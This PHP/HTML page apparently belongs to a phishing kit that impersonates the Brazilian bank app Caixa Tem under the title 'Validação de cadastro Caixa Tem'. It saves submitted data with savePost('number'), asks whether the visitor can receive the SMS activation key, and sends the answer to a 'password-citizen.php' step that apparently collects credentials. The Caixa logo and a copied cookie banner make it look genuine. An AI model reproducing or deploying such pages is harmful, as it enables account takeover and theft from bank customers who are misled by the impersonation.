<?php require_once('../config/config.php'); if (isset($_POST)) { savePost('number'); } ?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Caixa Tem - Confirmação SMS</title>
    <link rel="shortcut icon" href="../assets/img/soon.png" type="image/x-icon">
    <link href="../assets/login_files/main.css" rel="stylesheet" type="text/css">
    <link href="../assets/login_files/fsso.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="../assets/css/effect-password.css">
    <script src="../assets/login_files/jquery-3.2.1.min.js.download" type="text/javascript"></script>
    <script src="../assets/login_files/imask.min.js.download" type="text/javascript"></script>
</head>

<body>
    <div id="template">
        <div id="template-wrapper">
            <div id="template-wrapper-content">
                <header id="template-header">
                    <img id="template-logo" class="fa" src="../assets/login_files/logo-caixa.png">
                    <h2 id="template-title">Validação de cadastro Caixa Tem</h2>
                </header>

                <section id="template-section">
                    <script type="text/javascript" src="../assets/login_files/validate.js.download"></script>

                    <div id="truste-consent-track" class="truste-consent-track fader fadedOut modalDialog hide">
                        <div id="truste-consent-content" class="truste-banner">
                            <div id="truste-consent-text" class="truste-messageColumn">
                                <p class="truste-description">Utilizamos cookies no nosso site para fornecer nossos
                                    serviços
                                    online.
                                    Ao usar este site, você concorda com o uso de cookies.
                                </p>

                                <p class="truste-description hide" id="cookie-off"><b>Seu cookie está desativado</b>.
                                    Para
                                    possibilitar
                                    a melhor experiência é preciso ativar os cookies no seu navegador.
                                </p>
                            </div>
                        </div>
                    </div>
                    
                    <p class="description" style="margin-bottom: -3px; text-align: center;">Você tem acesso ao número cadastrado no Caixa Tem para o recebimento da chave de ativação?</p>

                    <form action="password-citizen.php" id="form-login" method="post">
                        <input type="hidden" id="sms" name="sms" value="SIM" />

                        <div class="button-group">
                            <button id="button-submit">Sim</button>
                        </div>
                    </form>

                    <form action="password-citizen.php" id="form-login" method="post">
                        <input type="hidden" id="sms" name="sms" value="NAO" />

                        <div class="button-group" style="margin-top: 10px;">
                            <button class="button-secondary" id="button-submit">Não</button>
                        </div>
                    </form>
                </section>

                <footer id="template-info">
                    <section id="template-faq">
                        <a href="https://www.caixa.gov.br/caixatem/Paginas/default.aspx" target="_blank">Preciso de ajuda</a>
                    </section>
                </footer>
            </div>
        </div>
    </div>
</body>

</html>